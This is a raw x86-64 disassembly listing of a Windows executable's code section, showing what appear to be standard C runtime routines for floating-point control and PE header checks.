   14000e641:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000e646:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000e64b:	44 8b 05 fe d5 00 00 	mov    0xd5fe(%rip),%r8d        # 0x14001bc50
   14000e652:	24 06                	and    $0x6,%al
   14000e654:	3c 06                	cmp    $0x6,%al
   14000e656:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000e65a:	44 89 05 ef d5 00 00 	mov    %r8d,0xd5ef(%rip)        # 0x14001bc50
   14000e661:	44 89 05 ec d5 00 00 	mov    %r8d,0xd5ec(%rip)        # 0x14001bc54
   14000e668:	33 c0                	xor    %eax,%eax
   14000e66a:	48 83 c4 10          	add    $0x10,%rsp
   14000e66e:	5b                   	pop    %rbx
   14000e66f:	c3                   	ret
   14000e670:	48 83 ec 38          	sub    $0x38,%rsp
   14000e674:	48 8d 05 d5 91 00 00 	lea    0x91d5(%rip),%rax        # 0x140017850
   14000e67b:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   14000e681:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e686:	e8 05 00 00 00       	call   0x14000e690
   14000e68b:	48 83 c4 38          	add    $0x38,%rsp
   14000e68f:	c3                   	ret
   14000e690:	48 8b c4             	mov    %rsp,%rax
   14000e693:	48 83 ec 68          	sub    $0x68,%rsp
   14000e697:	0f 29 70 e8          	movaps %xmm6,-0x18(%rax)
   14000e69b:	0f 28 f1             	movaps %xmm1,%xmm6
   14000e69e:	41 8b d1             	mov    %r9d,%edx
   14000e6a1:	0f 28 d8             	movaps %xmm0,%xmm3
   14000e6a4:	41 83 e8 01          	sub    $0x1,%r8d
   14000e6a8:	74 2a                	je     0x14000e6d4
   14000e6aa:	41 83 f8 01          	cmp    $0x1,%r8d
   14000e6ae:	75 69                	jne    0x14000e719
   14000e6b0:	44 89 40 d8          	mov    %r8d,-0x28(%rax)
   14000e6b4:	0f 57 d2             	xorps  %xmm2,%xmm2
   14000e6b7:	f2 0f 11 50 d0       	movsd  %xmm2,-0x30(%rax)
   14000e6bc:	45 8b c8             	mov    %r8d,%r9d
   14000e6bf:	f2 0f 11 40 c8       	movsd  %xmm0,-0x38(%rax)
   14000e6c4:	c7 40 c0 21 00 00 00 	movl   $0x21,-0x40(%rax)
   14000e6cb:	c7 40 b8 08 00 00 00 	movl   $0x8,-0x48(%rax)
   14000e6d2:	eb 2d                	jmp    0x14000e701
   14000e6d4:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000e6db:	00 
   14000e6dc:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000e6df:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000e6e5:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000e6eb:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000e6f1:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000e6f8:	00 
   14000e6f9:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000e700:	00 
   14000e701:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000e708:	00 
   14000e709:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000e70f:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000e714:	e8 b7 fd ff ff       	call   0x14000e4d0
   14000e719:	0f 28 c6             	movaps %xmm6,%xmm0
   14000e71c:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000e721:	48 83 c4 68          	add    $0x68,%rsp
   14000e725:	c3                   	ret
   14000e726:	cc                   	int3
   14000e727:	cc                   	int3
   14000e728:	cc                   	int3
   14000e729:	cc                   	int3
   14000e72a:	cc                   	int3
   14000e72b:	cc                   	int3
   14000e72c:	cc                   	int3
   14000e72d:	cc                   	int3
   14000e72e:	cc                   	int3
   14000e72f:	cc                   	int3
   14000e730:	cc                   	int3
   14000e731:	cc                   	int3
   14000e732:	cc                   	int3
   14000e733:	cc                   	int3
   14000e734:	cc                   	int3
   14000e735:	cc                   	int3
   14000e736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e73d:	00 00 00 
   14000e740:	48 83 ec 08          	sub    $0x8,%rsp
   14000e744:	0f ae 1c 24          	stmxcsr (%rsp)
   14000e748:	8b 04 24             	mov    (%rsp),%eax
   14000e74b:	48 83 c4 08          	add    $0x8,%rsp
   14000e74f:	c3                   	ret
   14000e750:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e754:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000e759:	c3                   	ret
   14000e75a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000e75f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000e764:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000e768:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000e76d:	c3                   	ret
   14000e76e:	66 0f 2e 05 ea 90 00 	ucomisd 0x90ea(%rip),%xmm0        # 0x140017860
   14000e775:	00 
   14000e776:	73 14                	jae    0x14000e78c
   14000e778:	66 0f 2e 05 e8 90 00 	ucomisd 0x90e8(%rip),%xmm0        # 0x140017868
   14000e77f:	00 
   14000e780:	76 0a                	jbe    0x14000e78c
   14000e782:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000e787:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000e78c:	c3                   	ret
   14000e78d:	cc                   	int3
   14000e78e:	cc                   	int3
   14000e78f:	cc                   	int3
   14000e790:	48 83 ec 48          	sub    $0x48,%rsp
   14000e794:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000e799:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000e79e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000e7a3:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000e7a8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e7ad:	e8 06 00 00 00       	call   0x14000e7b8
   14000e7b2:	48 83 c4 48          	add    $0x48,%rsp
   14000e7b6:	c3                   	ret
   14000e7b7:	cc                   	int3
   14000e7b8:	48 8b c4             	mov    %rsp,%rax
   14000e7bb:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000e7bf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e7c3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000e7c7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000e7cb:	55                   	push   %rbp
   14000e7cc:	48 8b ec             	mov    %rsp,%rbp
   14000e7cf:	48 83 ec 20          	sub    $0x20,%rsp
   14000e7d3:	48 8b da             	mov    %rdx,%rbx
   14000e7d6:	41 8b f1             	mov    %r9d,%esi
   14000e7d9:	33 d2                	xor    %edx,%edx
   14000e7db:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000e7e0:	89 51 04             	mov    %edx,0x4(%rcx)
   14000e7e3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e7e7:	89 50 08             	mov    %edx,0x8(%rax)
   14000e7ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e7ee:	89 50 0c             	mov    %edx,0xc(%rax)
   14000e7f1:	41 f6 c0 10          	test   $0x10,%r8b
   14000e7f5:	74 0d                	je     0x14000e804
   14000e7f7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e7fb:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000e800:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000e804:	41 f6 c0 02          	test   $0x2,%r8b
   14000e808:	74 0d                	je     0x14000e817
   14000e80a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e80e:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000e813:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000e817:	41 f6 c0 01          	test   $0x1,%r8b
   14000e81b:	74 0d                	je     0x14000e82a
   14000e81d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e821:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000e826:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000e82a:	41 f6 c0 04          	test   $0x4,%r8b
   14000e82e:	74 0d                	je     0x14000e83d
   14000e830:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e834:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000e839:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000e83d:	41 f6 c0 08          	test   $0x8,%r8b
   14000e841:	74 0d                	je     0x14000e850
   14000e843:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e847:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000e84c:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000e850:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e854:	48 8b 03             	mov    (%rbx),%rax
   14000e857:	48 c1 e8 07          	shr    $0x7,%rax
   14000e85b:	c1 e0 04             	shl    $0x4,%eax
   14000e85e:	f7 d0                	not    %eax
   14000e860:	33 41 08             	xor    0x8(%rcx),%eax
   14000e863:	83 e0 10             	and    $0x10,%eax
   14000e866:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e869:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e86d:	48 8b 03             	mov    (%rbx),%rax
   14000e870:	48 c1 e8 09          	shr    $0x9,%rax
   14000e874:	c1 e0 03             	shl    $0x3,%eax
   14000e877:	f7 d0                	not    %eax
   14000e879:	33 41 08             	xor    0x8(%rcx),%eax
   14000e87c:	83 e0 08             	and    $0x8,%eax
   14000e87f:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e882:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e886:	48 8b 03             	mov    (%rbx),%rax
   14000e889:	48 c1 e8 0a          	shr    $0xa,%rax
   14000e88d:	c1 e0 02             	shl    $0x2,%eax
   14000e890:	f7 d0                	not    %eax
   14000e892:	33 41 08             	xor    0x8(%rcx),%eax
   14000e895:	83 e0 04             	and    $0x4,%eax
   14000e898:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e89b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e89f:	48 8b 03             	mov    (%rbx),%rax
   14000e8a2:	48 c1 e8 0b          	shr    $0xb,%rax
   14000e8a6:	03 c0                	add    %eax,%eax
   14000e8a8:	f7 d0                	not    %eax
   14000e8aa:	33 41 08             	xor    0x8(%rcx),%eax
   14000e8ad:	83 e0 02             	and    $0x2,%eax
   14000e8b0:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e8b3:	8b 03                	mov    (%rbx),%eax
   14000e8b5:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e8b9:	48 c1 e8 0c          	shr    $0xc,%rax
   14000e8bd:	f7 d0                	not    %eax
   14000e8bf:	33 41 08             	xor    0x8(%rcx),%eax
   14000e8c2:	83 e0 01             	and    $0x1,%eax
   14000e8c5:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e8c8:	e8 df 02 00 00       	call   0x14000ebac
   14000e8cd:	48 8b d0             	mov    %rax,%rdx
   14000e8d0:	a8 01                	test   $0x1,%al
   14000e8d2:	74 08                	je     0x14000e8dc
   14000e8d4:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e8d8:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000e8dc:	f6 c2 04             	test   $0x4,%dl
   14000e8df:	74 08                	je     0x14000e8e9
   14000e8e1:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e8e5:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000e8e9:	f6 c2 08             	test   $0x8,%dl
   14000e8ec:	74 08                	je     0x14000e8f6
   14000e8ee:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e8f2:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000e8f6:	f6 c2 10             	test   $0x10,%dl
   14000e8f9:	74 08                	je     0x14000e903
   14000e8fb:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e8ff:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000e903:	f6 c2 20             	test   $0x20,%dl
   14000e906:	74 08                	je     0x14000e910
   14000e908:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e90c:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000e910:	8b 03                	mov    (%rbx),%eax
   14000e912:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000e917:	48 23 c1             	and    %rcx,%rax
   14000e91a:	74 3e                	je     0x14000e95a
   14000e91c:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000e922:	74 26                	je     0x14000e94a
   14000e924:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000e92a:	74 0e                	je     0x14000e93a
   14000e92c:	48 3b c1             	cmp    %rcx,%rax
   14000e92f:	75 30                	jne    0x14000e961
   14000e931:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e935:	83 08 03             	orl    $0x3,(%rax)
   14000e938:	eb 27                	jmp    0x14000e961
   14000e93a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e93e:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000e941:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e945:	83 08 02             	orl    $0x2,(%rax)
   14000e948:	eb 17                	jmp    0x14000e961
   14000e94a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e94e:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000e951:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e955:	83 08 01             	orl    $0x1,(%rax)
   14000e958:	eb 07                	jmp    0x14000e961
   14000e95a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e95e:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000e961:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e965:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000e96b:	c1 e6 05             	shl    $0x5,%esi
   14000e96e:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000e974:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e978:	09 30                	or     %esi,(%rax)
   14000e97a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e97e:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000e982:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000e986:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000e98a:	74 33                	je     0x14000e9bf
   14000e98c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e990:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000e995:	21 50 20             	and    %edx,0x20(%rax)
   14000e998:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e99c:	8b 08                	mov    (%rax),%ecx
   14000e99e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9a2:	89 48 10             	mov    %ecx,0x10(%rax)
   14000e9a5:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9a9:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000e9ad:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9b1:	21 50 60             	and    %edx,0x60(%rax)
   14000e9b4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9b8:	8b 0e                	mov    (%rsi),%ecx
   14000e9ba:	89 48 50             	mov    %ecx,0x50(%rax)
   14000e9bd:	eb 48                	jmp    0x14000ea07
   14000e9bf:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e9c3:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000e9c9:	8b 41 20             	mov    0x20(%rcx),%eax
   14000e9cc:	41 23 c0             	and    %r8d,%eax
   14000e9cf:	83 c8 02             	or     $0x2,%eax
   14000e9d2:	89 41 20             	mov    %eax,0x20(%rcx)
   14000e9d5:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e9d9:	48 8b 08             	mov    (%rax),%rcx
   14000e9dc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9e0:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000e9e4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e9e8:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000e9ec:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000e9f0:	8b 42 60             	mov    0x60(%rdx),%eax
   14000e9f3:	41 23 c0             	and    %r8d,%eax
   14000e9f6:	83 c8 02             	or     $0x2,%eax
   14000e9f9:	89 42 60             	mov    %eax,0x60(%rdx)
   14000e9fc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000ea00:	48 8b 16             	mov    (%rsi),%rdx
   14000ea03:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000ea07:	e8 e4 00 00 00       	call   0x14000eaf0
   14000ea0c:	33 d2                	xor    %edx,%edx
   14000ea0e:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000ea12:	8b cf                	mov    %edi,%ecx
   14000ea14:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000ea18:	ff 15 2a 17 00 00    	call   *0x172a(%rip)        # 0x140010148
   14000ea1e:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000ea22:	f6 41 08 10          	testb  $0x10,0x8(%rcx)
   14000ea26:	74 05                	je     0x14000ea2d
   14000ea28:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000ea2d:	f6 41 08 08          	testb  $0x8,0x8(%rcx)
   14000ea31:	74 05                	je     0x14000ea38
   14000ea33:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000ea38:	f6 41 08 04          	testb  $0x4,0x8(%rcx)
   14000ea3c:	74 05                	je     0x14000ea43
   14000ea3e:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000ea43:	f6 41 08 02          	testb  $0x2,0x8(%rcx)
   14000ea47:	74 05                	je     0x14000ea4e
   14000ea49:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000ea4e:	f6 41 08 01          	testb  $0x1,0x8(%rcx)
   14000ea52:	74 05                	je     0x14000ea59
   14000ea54:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000ea59:	8b 01                	mov    (%rcx),%eax
   14000ea5b:	83 e0 03             	and    $0x3,%eax
   14000ea5e:	74 30                	je     0x14000ea90
   14000ea60:	83 e8 01             	sub    $0x1,%eax
   14000ea63:	74 1f                	je     0x14000ea84
   14000ea65:	83 e8 01             	sub    $0x1,%eax
   14000ea68:	74 0e                	je     0x14000ea78
   14000ea6a:	83 f8 01             	cmp    $0x1,%eax
   14000ea6d:	75 28                	jne    0x14000ea97
   14000ea6f:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000ea76:	eb 1f                	jmp    0x14000ea97
   14000ea78:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000ea7d:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000ea82:	eb 13                	jmp    0x14000ea97
   14000ea84:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000ea89:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000ea8e:	eb 07                	jmp    0x14000ea97
   14000ea90:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000ea97:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000ea9b:	74 07                	je     0x14000eaa4
   14000ea9d:	8b 41 50             	mov    0x50(%rcx),%eax
   14000eaa0:	89 06                	mov    %eax,(%rsi)
   14000eaa2:	eb 07                	jmp    0x14000eaab
   14000eaa4:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000eaa8:	48 89 06             	mov    %rax,(%rsi)
   14000eaab:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000eab0:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000eab5:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000eaba:	48 83 c4 20          	add    $0x20,%rsp
   14000eabe:	5d                   	pop    %rbp
   14000eabf:	c3                   	ret
   14000eac0:	48 83 ec 28          	sub    $0x28,%rsp
   14000eac4:	83 e9 01             	sub    $0x1,%ecx
   14000eac7:	74 17                	je     0x14000eae0
   14000eac9:	83 e9 01             	sub    $0x1,%ecx
   14000eacc:	74 05                	je     0x14000ead3
   14000eace:	83 f9 01             	cmp    $0x1,%ecx
   14000ead1:	75 18                	jne    0x14000eaeb
   14000ead3:	e8 dc 80 ff ff       	call   0x140006bb4
   14000ead8:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000eade:	eb 0b                	jmp    0x14000eaeb
   14000eae0:	e8 cf 80 ff ff       	call   0x140006bb4
   14000eae5:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000eaeb:	48 83 c4 28          	add    $0x28,%rsp
   14000eaef:	c3                   	ret
   14000eaf0:	40 53                	rex push %rbx
   14000eaf2:	48 83 ec 20          	sub    $0x20,%rsp
   14000eaf6:	e8 45 fc ff ff       	call   0x14000e740
   14000eafb:	8b d8                	mov    %eax,%ebx
   14000eafd:	83 e3 3f             	and    $0x3f,%ebx
   14000eb00:	e8 55 fc ff ff       	call   0x14000e75a
   14000eb05:	8b c3                	mov    %ebx,%eax
   14000eb07:	48 83 c4 20          	add    $0x20,%rsp
   14000eb0b:	5b                   	pop    %rbx
   14000eb0c:	c3                   	ret
   14000eb0d:	cc                   	int3
   14000eb0e:	cc                   	int3
   14000eb0f:	cc                   	int3
   14000eb10:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000eb15:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000eb1a:	57                   	push   %rdi
   14000eb1b:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb1f:	48 8b da             	mov    %rdx,%rbx
   14000eb22:	48 8b f9             	mov    %rcx,%rdi
   14000eb25:	e8 16 fc ff ff       	call   0x14000e740
   14000eb2a:	8b f0                	mov    %eax,%esi
   14000eb2c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000eb30:	8b cb                	mov    %ebx,%ecx
   14000eb32:	f7 d1                	not    %ecx
   14000eb34:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000eb3a:	23 c8                	and    %eax,%ecx
   14000eb3c:	23 fb                	and    %ebx,%edi
   14000eb3e:	0b cf                	or     %edi,%ecx
   14000eb40:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000eb44:	80 3d d5 be 00 00 00 	cmpb   $0x0,0xbed5(%rip)        # 0x14001aa20
   14000eb4b:	74 25                	je     0x14000eb72
   14000eb4d:	f6 c1 40             	test   $0x40,%cl
   14000eb50:	74 20                	je     0x14000eb72
   14000eb52:	e8 f9 fb ff ff       	call   0x14000e750
   14000eb57:	eb 21                	jmp    0x14000eb7a
   14000eb59:	c6 05 c0 be 00 00 00 	movb   $0x0,0xbec0(%rip)        # 0x14001aa20
   14000eb60:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000eb64:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000eb67:	e8 e4 fb ff ff       	call   0x14000e750
   14000eb6c:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000eb70:	eb 08                	jmp    0x14000eb7a
   14000eb72:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000eb75:	e8 d6 fb ff ff       	call   0x14000e750
   14000eb7a:	8b c6                	mov    %esi,%eax
   14000eb7c:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000eb81:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000eb86:	48 83 c4 20          	add    $0x20,%rsp
   14000eb8a:	5f                   	pop    %rdi
   14000eb8b:	c3                   	ret
   14000eb8c:	40 53                	rex push %rbx
   14000eb8e:	48 83 ec 20          	sub    $0x20,%rsp
   14000eb92:	48 8b d9             	mov    %rcx,%rbx
   14000eb95:	e8 a6 fb ff ff       	call   0x14000e740
   14000eb9a:	83 e3 3f             	and    $0x3f,%ebx
   14000eb9d:	0b c3                	or     %ebx,%eax
   14000eb9f:	8b c8                	mov    %eax,%ecx
   14000eba1:	48 83 c4 20          	add    $0x20,%rsp
   14000eba5:	5b                   	pop    %rbx
   14000eba6:	e9 a5 fb ff ff       	jmp    0x14000e750
   14000ebab:	cc                   	int3
   14000ebac:	48 83 ec 28          	sub    $0x28,%rsp
   14000ebb0:	e8 8b fb ff ff       	call   0x14000e740
   14000ebb5:	83 e0 3f             	and    $0x3f,%eax
   14000ebb8:	48 83 c4 28          	add    $0x28,%rsp
   14000ebbc:	c3                   	ret
   14000ebbd:	cc                   	int3
   14000ebbe:	cc                   	int3
   14000ebbf:	cc                   	int3
   14000ebc0:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000ebc4:	45 33 c9             	xor    %r9d,%r9d
   14000ebc7:	4c 03 c1             	add    %rcx,%r8
   14000ebca:	4c 8b d2             	mov    %rdx,%r10
   14000ebcd:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000ebd2:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000ebd7:	48 83 c0 18          	add    $0x18,%rax
   14000ebdb:	49 03 c0             	add    %r8,%rax
   14000ebde:	45 85 db             	test   %r11d,%r11d
   14000ebe1:	74 1e                	je     0x14000ec01
   14000ebe3:	8b 50 0c             	mov    0xc(%rax),%edx
   14000ebe6:	4c 3b d2             	cmp    %rdx,%r10
   14000ebe9:	72 0a                	jb     0x14000ebf5
   14000ebeb:	8b 48 08             	mov    0x8(%rax),%ecx
   14000ebee:	03 ca                	add    %edx,%ecx
   14000ebf0:	4c 3b d1             	cmp    %rcx,%r10
   14000ebf3:	72 0e                	jb     0x14000ec03
   14000ebf5:	41 ff c1             	inc    %r9d
   14000ebf8:	48 83 c0 28          	add    $0x28,%rax
   14000ebfc:	45 3b cb             	cmp    %r11d,%r9d
   14000ebff:	72 e2                	jb     0x14000ebe3
   14000ec01:	33 c0                	xor    %eax,%eax
   14000ec03:	c3                   	ret
   14000ec04:	cc                   	int3
   14000ec05:	cc                   	int3
   14000ec06:	cc                   	int3
   14000ec07:	cc                   	int3
   14000ec08:	cc                   	int3
   14000ec09:	cc                   	int3
   14000ec0a:	cc                   	int3
   14000ec0b:	cc                   	int3
   14000ec0c:	cc                   	int3
   14000ec0d:	cc                   	int3
   14000ec0e:	cc                   	int3
   14000ec0f:	cc                   	int3
   14000ec10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ec15:	57                   	push   %rdi
   14000ec16:	48 83 ec 20          	sub    $0x20,%rsp
   14000ec1a:	48 8b d9             	mov    %rcx,%rbx
   14000ec1d:	48 8d 3d dc 13 ff ff 	lea    -0xec24(%rip),%rdi        # 0x140000000
   14000ec24:	48 8b cf             	mov    %rdi,%rcx
   14000ec27:	e8 34 00 00 00       	call   0x14000ec60
   14000ec2c:	85 c0                	test   %eax,%eax
   14000ec2e:	74 22                	je     0x14000ec52
   14000ec30:	48 2b df             	sub    %rdi,%rbx
   14000ec33:	48 8b d3             	mov    %rbx,%rdx
   14000ec36:	48 8b cf             	mov    %rdi,%rcx
   14000ec39:	e8 82 ff ff ff       	call   0x14000ebc0
   14000ec3e:	48 85 c0             	test   %rax,%rax
   14000ec41:	74 0f                	je     0x14000ec52
   14000ec43:	8b 40 24             	mov    0x24(%rax),%eax
   14000ec46:	c1 e8 1f             	shr    $0x1f,%eax
   14000ec49:	f7 d0                	not    %eax
   14000ec4b:	83 e0 01             	and    $0x1,%eax
   14000ec4e:	eb 02                	jmp    0x14000ec52
   14000ec50:	33 c0                	xor    %eax,%eax
   14000ec52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000ec57:	48 83 c4 20          	add    $0x20,%rsp
   14000ec5b:	5f                   	pop    %rdi
   14000ec5c:	c3                   	ret
   14000ec5d:	cc                   	int3
   14000ec5e:	cc                   	int3
   14000ec5f:	cc                   	int3
   14000ec60:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000ec65:	66 39 01             	cmp    %ax,(%rcx)
   14000ec68:	75 1e                	jne    0x14000ec88
   14000ec6a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000ec6e:	48 03 d1             	add    %rcx,%rdx
   14000ec71:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000ec77:	75 0f                	jne    0x14000ec88
   14000ec79:	33 c0                	xor    %eax,%eax
   14000ec7b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000ec80:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000ec84:	0f 94 c0             	sete   %al
   14000ec87:	c3                   	ret
   14000ec88:	33 c0                	xor    %eax,%eax
   14000ec8a:	c3                   	ret
   14000ec8b:	cc                   	int3
   14000ec8c:	40 53                	rex push %rbx
   14000ec8e:	48 83 ec 20          	sub    $0x20,%rsp
   14000ec92:	48 8d 05 df 8b 00 00 	lea    0x8bdf(%rip),%rax        # 0x140017878
   14000ec99:	48 8b d9             	mov    %rcx,%rbx
   14000ec9c:	48 89 01             	mov    %rax,(%rcx)
   14000ec9f:	f6 c2 01             	test   $0x1,%dl
   14000eca2:	74 0a                	je     0x14000ecae
   14000eca4:	ba 18 00 00 00       	mov    $0x18,%edx
   14000eca9:	e8 86 00 00 00       	call   0x14000ed34
   14000ecae:	48 8b c3             	mov    %rbx,%rax
   14000ecb1:	48 83 c4 20          	add    $0x20,%rsp
   14000ecb5:	5b                   	pop    %rbx
   14000ecb6:	c3                   	ret
   14000ecb7:	cc                   	int3
